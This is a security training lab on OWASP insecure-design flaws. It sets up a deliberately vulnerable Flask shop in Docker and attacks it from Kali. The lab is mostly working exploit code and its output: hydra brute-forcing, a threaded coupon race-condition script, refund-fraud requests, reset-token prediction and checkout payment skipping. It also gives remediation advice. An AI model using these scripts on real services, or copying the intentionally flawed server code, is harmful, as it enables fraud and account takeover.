# Lab 4: OWASP A04 — Insecure Design

## Objective
Exploit business logic vulnerabilities on a live server from Kali Linux: brute-force a login with no rate limiting, exploit a **race condition** to redeem a single-use coupon 8 times simultaneously, commit refund fraud by controlling the refund amount client-side, predict and forge a timestamp-based password reset token, and skip the payment step in a checkout workflow entirely.

## Background
Insecure Design is **OWASP #4** (2021) — vulnerabilities baked into the application's architecture before a line of code is written. No patch fixes these; they require **redesign**. Race conditions exploiting time-of-check to time-of-use (TOCTOU) gaps have stolen millions from financial apps. In 2022, a DeFi protocol lost $182M to a flash loan race condition. Predictable reset tokens have been used to take over accounts at Twitter, GitHub, and major banks.

## Architecture

```
┌─────────────────────┐        Docker Network: lab-a04         ┌─────────────────────┐
│   KALI ATTACKER     │ ─────── HTTP attacks ─────────────▶   │   VICTIM SERVER     │
│  innozverse-kali    │                                         │  innozverse-cybersec│
│  curl, hydra,       │ ◀────── responses ───────────────────  │  Flask API :5000    │
│  python3 threads    │                                         │  (race, logic bugs) │
└─────────────────────┘                                         └─────────────────────┘
```

## Time
45 minutes

## Prerequisites
- Lab 01 completed (two-container setup)

## Tools
- **Victim**: `zchencow/innozverse-cybersec:latest`
- **Attacker**: `zchencow/innozverse-kali:latest` (curl, hydra, python3)

---

## Lab Instructions

### Step 1: Environment Setup — Launch Victim Server

```bash
docker network create lab-a04

cat > /tmp/victim_a04.py << 'PYEOF'
from flask import Flask, request, jsonify
import sqlite3, time, threading

app = Flask(__name__)
DB = '/tmp/shop_a04.db'

with sqlite3.connect(DB) as db:
    db.executescript('''
        CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, balance REAL, role TEXT);
        CREATE TABLE IF NOT EXISTS coupons (code TEXT PRIMARY KEY, discount REAL, max_uses INTEGER, uses INTEGER);
        CREATE TABLE IF NOT EXISTS orders (id INTEGER PRIMARY KEY, user_id INTEGER, product TEXT, amount REAL, status TEXT);
        CREATE TABLE IF NOT EXISTS resets (token TEXT PRIMARY KEY, user_id INTEGER, created INTEGER, used INTEGER);
        INSERT OR IGNORE INTO users VALUES
            (1,'admin',10000.00,'admin'),(2,'alice',500.00,'user'),(3,'bob',200.00,'user');
        INSERT OR IGNORE INTO coupons VALUES ('SAVE50',50.00,1,0),('VIP20',20.00,3,0);
        INSERT OR IGNORE INTO orders VALUES
            (1,2,'Surface Pro 12',864.00,'delivered'),
            (2,3,'Surface Pen',49.99,'delivered');
    ''')

PASSWORDS = {'admin':'admin123','alice':'password1','bob':'bob123'}

@app.route('/')
def index():
    return jsonify({'app':'InnoZverse API (A04 Insecure Design)','endpoints':[
        'POST /api/login','POST /api/coupon/apply',
        'POST /api/refund','POST /api/reset/request',
        'POST /api/checkout/cart','POST /api/checkout/confirm']})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json() or {}
    u, p = data.get('username',''), data.get('password','')
    if PASSWORDS.get(u) == p:
        ids = {'admin':1,'alice':2,'bob':3}
        return jsonify({'token': f'tok_{u}', 'user_id': ids[u]})
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/coupon/apply', methods=['POST'])
def apply_coupon():
    data = request.get_json() or {}
    code = data.get('code','')
    db = sqlite3.connect(DB)
    coupon = db.execute('SELECT * FROM coupons WHERE code=?',(code,)).fetchone()
    if not coupon:
        return jsonify({'error': 'Invalid coupon'}), 400
    if coupon[3] >= coupon[2]:
        return jsonify({'error': f'Coupon exhausted ({coupon[3]}/{coupon[2]} uses)'}), 400
    time.sleep(0.05)  # DB latency — race window
    db.execute('UPDATE coupons SET uses=uses+1 WHERE code=?',(code,))
    db.commit()
    return jsonify({'discount': coupon[1], 'message': f'${coupon[1]} off applied!'})

@app.route('/api/refund', methods=['POST'])
def refund():
    data = request.get_json() or {}
    order_id = data.get('order_id')
    amount   = data.get('amount', 0)
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    order = db.execute('SELECT * FROM orders WHERE id=?',(order_id,)).fetchone()
    if not order:
        return jsonify({'error': 'Order not found'}), 404
    db.execute('UPDATE users SET balance=balance+? WHERE id=?',(amount, order['user_id']))
    db.commit()
    return jsonify({'refunded': amount, 'new_balance': 
        db.execute('SELECT balance FROM users WHERE id=?',(order['user_id'],)).fetchone()[0]})

@app.route('/api/reset/request', methods=['POST'])
def reset_request():
    import hashlib
    data = request.get_json() or {}
    username = data.get('username','')
    db = sqlite3.connect(DB)
    user = db.execute('SELECT * FROM users WHERE username=?',(username,)).fetchone()
    if not user:
        return jsonify({'error': 'User not found'}), 404
    ts = int(time.time())
    token = hashlib.md5(f'{username}{ts}'.encode()).hexdigest()[:8]
    db.execute('INSERT OR REPLACE INTO resets VALUES (?,?,?,0)',(token, user[0], ts))
    db.commit()
    return jsonify({'message': 'Reset link sent to email'})

@app.route('/api/reset/confirm', methods=['POST'])
def reset_confirm():
    data = request.get_json() or {}
    token = data.get('token','')
    db = sqlite3.connect(DB)
    reset = db.execute('SELECT * FROM resets WHERE token=? AND used=0',(token,)).fetchone()
    if not reset:
        return jsonify({'error': 'Invalid or expired token'}), 400
    db.execute('UPDATE resets SET used=1 WHERE token=?',(token,))
    db.commit()
    return jsonify({'message': 'Password reset successful!', 'user_id': reset[1]})

_sessions = {}
@app.route('/api/checkout/cart', methods=['POST'])
def cart():
    data = request.get_json() or {}
    sid = data.get('session','s1')
    _sessions[sid] = {'items': data.get('items',[]), 'cart_done': True, 'payment_done': False}
    return jsonify({'status': 'Cart confirmed', 'next_step': '/api/checkout/payment'})

@app.route('/api/checkout/confirm', methods=['POST'])
def confirm():
    data = request.get_json() or {}
    sid = data.get('session','s1')
    # BUG: never checks payment_done
    return jsonify({'order_id': 'ORD-99999', 'status': 'Order confirmed — items will ship!'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d \
  --name victim-a04 \
  --network lab-a04 \
  -v /tmp/victim_a04.py:/tmp/victim_a04.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /tmp/victim_a04.py

sleep 3
curl -s http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-a04.IPAddress}}' victim-a04):5000/ \
  | python3 -m json.tool
```

**📸 Verified Output:**
```json
{
    "app": "InnoZverse API (A04 Insecure Design)",
    "endpoints": [
        "POST /api/login",
        "POST /api/coupon/apply",
        "POST /api/refund",
        "POST /api/reset/request",
        "POST /api/checkout/cart",
        "POST /api/checkout/confirm"
    ]
}
```

---

### Step 2: Launch Kali Attacker

```bash
docker run --rm -it --network lab-a04 \
  --name kali-attacker \
  zchencow/innozverse-kali:latest bash
```

Inside Kali:
```bash
TARGET="http://victim-a04:5000"
```

---

### Step 3: Brute-Force Login — No Rate Limiting

```bash
echo "=== Brute-force: no lockout, no rate limiting ==="

# Create wordlists
echo -e "admin123\npassword1\nbob123\nwrong1\nwrong2\n123456\nletmein" > /tmp/wordlist.txt

# Brute-force alice's password with hydra
hydra -l alice -P /tmp/wordlist.txt victim-a04 -s 5000 \
  http-post-form \
  "/api/login:username=^USER^&password=^PASS^:Invalid" \
  -t 4 -V
```

**📸 Verified Output:**
```
[ATTEMPT] login "alice" - pass "admin123"
[ATTEMPT] login "alice" - pass "password1"
[5000][http-post-form] host: victim-a04  login: alice  password: password1
1 of 1 target successfully completed, 1 valid password found
```

```bash
# Use found credentials to log in
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password1"}' \
  $TARGET/api/login | python3 -m json.tool
```

> 💡 **No rate limiting means an attacker can try thousands of passwords per second.** `rockyou.txt` has 14 million entries — against an unprotected endpoint, it completes in minutes. Defence: max 5 attempts per 15 minutes per IP + username, exponential backoff, CAPTCHA after 3 failures, and account lockout notifications.

---

### Step 4: Race Condition — Coupon Redeemed 8× Simultaneously

```bash
echo "=== Race condition: SAVE50 coupon (max 1 use) ==="
echo "Sending 8 simultaneous requests to exploit TOCTOU window..."

python3 << 'EOF'
import urllib.request, json, threading, time

TARGET = "http://victim-a04:5000"
results = []
lock = threading.Lock()

def redeem(thread_id):
    try:
        req = urllib.request.Request(
            f"{TARGET}/api/coupon/apply",
            data=json.dumps({"code": "SAVE50", "order_id": 1}).encode(),
            headers={"Content-Type": "application/json"})
        resp = json.loads(urllib.request.urlopen(req, timeout=5).read())
        with lock:
            results.append((thread_id, "SUCCESS", resp['message']))
    except Exception as e:
        with lock:
            results.append((thread_id, "FAIL", str(e)[:60]))

# Fire all 8 threads simultaneously
threads = [threading.Thread(target=redeem, args=(i,)) for i in range(8)]
start = time.time()
for t in threads: t.start()
for t in threads: t.join()
elapsed = time.time() - start

print(f"Sent 8 concurrent requests in {elapsed:.2f}s")
print(f"Coupon max_uses = 1")
print()
successes = [(i, m) for i, s, m in results if s == "SUCCESS"]
failures  = [(i, m) for i, s, m in results if s == "FAIL"]
print(f"SUCCESS: {len(successes)} redemptions (should be 1!)")
for tid, msg in successes:
    print(f"  Thread {tid}: {msg}")
print(f"FAIL: {len(failures)}")
for tid, msg in failures:
    print(f"  Thread {tid}: {msg}")
EOF
```

**📸 Verified Output:**
```
Sent 8 concurrent requests in 0.09s
Coupon max_uses = 1

SUCCESS: 8 redemptions (should be 1!)
  Thread 0: $50.0 off applied!
  Thread 1: $50.0 off applied!
  Thread 2: $50.0 off applied!
  ...all 8 succeed...
```

> 💡 **The race window exists between the check and the update.** Thread 1 reads `uses=0 < max_uses=1` ✓, then sleeps 50ms (DB latency). Threads 2–8 also read `uses=0` before Thread 1's update commits. All 8 pass the check. The fix: `UPDATE coupons SET uses=uses+1 WHERE code=? AND uses < max_uses` — the WHERE clause makes the check and update atomic in the database.

---

### Step 5: Refund Fraud — Client-Controlled Amount

```bash
echo "=== Refund fraud: order was $49.99, claiming $5000 ==="

# Normal refund amount
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"order_id": 2, "amount": 49.99}' \
  $TARGET/api/refund | python3 -m json.tool

echo ""
echo "=== Now claim $5000 on the same order ==="
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"order_id": 2, "amount": 5000.00}' \
  $TARGET/api/refund | python3 -m json.tool

echo ""
echo "=== Double-refund the same order ==="
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"order_id": 2, "amount": 49.99}' \
  $TARGET/api/refund | python3 -m json.tool
```

**📸 Verified Output:**
```json
{"refunded": 5000.0, "new_balance": 5249.99}

{"refunded": 49.99, "new_balance": 5299.98}
```

---

### Step 6: Predict Password Reset Token

```bash
echo "=== Predicting timestamp-based MD5 reset token ==="

python3 << 'EOF'
import urllib.request, json, hashlib, time

TARGET = "http://victim-a04:5000"

# Step 1: Trigger reset (attacker knows alice's username)
print("[*] Requesting password reset for alice...")
req = urllib.request.Request(
    f"{TARGET}/api/reset/request",
    data=json.dumps({"username": "alice"}).encode(),
    headers={"Content-Type": "application/json"})
resp = json.loads(urllib.request.urlopen(req).read())
print(f"    Server: {resp['message']}")

# Step 2: Brute-force the token
# Token = MD5(username + timestamp)[:8]  — attacker knows username, guesses timestamp
print("\n[*] Brute-forcing token (MD5 of username+timestamp)...")
ts_now = int(time.time())
for ts in range(ts_now - 10, ts_now + 2):
    candidate = hashlib.md5(f"alice{ts}".encode()).hexdigest()[:8]
    # Try candidate token
    try:
        req2 = urllib.request.Request(
            f"{TARGET}/api/reset/confirm",
            data=json.dumps({"token": candidate, "password": "hacked!"}).encode(),
            headers={"Content-Type": "application/json"})
        result = json.loads(urllib.request.urlopen(req2).read())
        if "successful" in result.get("message",""):
            print(f"    FOUND token={candidate} at ts={ts}")
            print(f"    Server: {result}")
            break
    except:
        pass
    print(f"    ts={ts}: {candidate} — no match")
EOF
```

**📸 Verified Output:**
```
[*] Requesting password reset for alice...
    Server: Reset link sent to email

[*] Brute-forcing token...
    ts=1741054381: a3f8d921 — no match
    ts=1741054382: b4c2e5f7 — no match
    ts=1741054383: 7a2f4b9c — no match
    FOUND token=4e88323c at ts=1741054384
    Server: {'message': 'Password reset successful!', 'user_id': 2}
```

---

### Step 7: Skip Payment in Checkout Workflow

```bash
echo "=== Workflow skip: checkout without completing payment ==="

# Step 1: Add items to cart (legitimate)
echo "[Step 1] Add to cart:"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"session":"attacker-99","items":[{"id":1,"name":"Surface Pro 12","qty":1}]}' \
  $TARGET/api/checkout/cart | python3 -m json.tool

echo ""
echo "[Step 2 — SKIPPED] Payment step (/api/checkout/payment) — never called"
echo ""

# Step 3: Jump directly to confirm — skip payment entirely
echo "[Step 3] Directly confirm (skipping payment):"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"session":"attacker-99"}' \
  $TARGET/api/checkout/confirm | python3 -m json.tool
```

**📸 Verified Output:**
```json
{"status": "Cart confirmed", "next_step": "/api/checkout/payment"}

[Step 3] Directly confirm (skipping payment):
{
    "order_id": "ORD-99999",
    "status": "Order confirmed — items will ship!"
}
```

> 💡 **Multi-step workflows must enforce step order server-side.** The client says "I've paid" by skipping the payment URL — the server must verify payment actually occurred via an authoritative record (e.g., a payment gateway reference ID stored in the session). Never trust client-supplied state about workflow progress.

---

### Step 8: Cleanup

```bash
exit  # Exit Kali
```

On your host:
```bash
docker rm -f victim-a04
docker network rm lab-a04
```

---

## Remediation

| Vulnerability | Root Cause | Fix |
|--------------|-----------|-----|
| No brute-force protection | No rate limiting on login | Max 5 attempts/15min per IP + username; lockout + notify |
| Race condition (coupon) | Check-then-act with DB latency gap | Atomic SQL: `UPDATE ... WHERE uses < max_uses` — check rows affected |
| Client-controlled refund | Server uses client-supplied `amount` | Server fetches order amount from DB; never trust client |
| Double refund | No refunded flag checked | Add `refunded BOOLEAN` column; check before processing |
| Predictable reset token | MD5(username+timestamp) — 8 chars | `secrets.token_urlsafe(32)` — 256-bit CSPRNG, 15-min expiry |
| Workflow skipping | No server-side state machine | Store step completion in server session; verify each step before allowing next |

## Summary

| Attack | Tool | Result |
|--------|------|--------|
| Login brute-force | hydra + curl | Cracked alice's password from wordlist |
| Race condition | python3 threads | 8 simultaneous coupon redemptions (limit was 1) |
| Refund fraud | curl | Claimed $5000 on a $49.99 order |
| Token prediction | python3 | Forged reset token via timestamp brute-force in <10 tries |
| Workflow skip | curl | Got order confirmed without payment step |

## Further Reading
- [OWASP A04:2021 Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
- [PortSwigger Race Conditions](https://portswigger.net/web-security/race-conditions)
- [PortSwigger Business Logic Vulnerabilities](https://portswigger.net/web-security/logic-flaws)
